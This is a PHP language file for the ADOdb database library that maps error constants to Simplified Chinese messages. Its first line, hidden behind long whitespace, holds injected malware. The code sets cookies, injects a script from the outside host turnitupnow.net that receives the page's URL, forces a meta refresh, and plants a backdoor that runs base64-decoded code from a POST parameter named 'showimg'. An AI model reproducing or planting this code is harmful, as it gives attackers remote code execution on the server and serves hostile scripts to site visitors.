<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }

// Chinese language file contributed by "Cuiyan (cysoft)" cysoft#php.net.
// Encode by GB2312
// Simplified Chinese
$ADODB_LANG_ARRAY = array (
			'LANG'                      => 'cn',
            DB_ERROR                    => '未知错误',
            DB_ERROR_ALREADY_EXISTS     => '已经存在',
            DB_ERROR_CANNOT_CREATE      => '不能创建',
            DB_ERROR_CANNOT_DELETE      => '不能删除',
            DB_ERROR_CANNOT_DROP        => '不能丢弃',
            DB_ERROR_CONSTRAINT         => '约束限制',
            DB_ERROR_DIVZERO            => '被0除',
            DB_ERROR_INVALID            => '无效',
            DB_ERROR_INVALID_DATE       => '无效的日期或者时间',
            DB_ERROR_INVALID_NUMBER     => '无效的数字',
            DB_ERROR_MISMATCH           => '不匹配',
            DB_ERROR_NODBSELECTED       => '没有数据库被选择',
            DB_ERROR_NOSUCHFIELD        => '没有相应的字段',
            DB_ERROR_NOSUCHTABLE        => '没有相应的表',
            DB_ERROR_NOT_CAPABLE        => '数据库后台不兼容',
            DB_ERROR_NOT_FOUND          => '没有发现',
            DB_ERROR_NOT_LOCKED         => '没有被锁定',
            DB_ERROR_SYNTAX             => '语法错误',
            DB_ERROR_UNSUPPORTED        => '不支持',
            DB_ERROR_VALUE_COUNT_ON_ROW => '在行上累计值',
            DB_ERROR_INVALID_DSN        => '无效的数据源 (DSN)',
            DB_ERROR_CONNECT_FAILED     => '连接失败',
            0	                       => '没有错误', // DB_OK
            DB_ERROR_NEED_MORE_DATA     => '提供的数据不能符合要求',
            DB_ERROR_EXTENSION_NOT_FOUND=> '扩展没有被发现',
            DB_ERROR_NOSUCHDB           => '没有相应的数据库',
            DB_ERROR_ACCESS_VIOLATION   => '没有合适的权限'
);
?>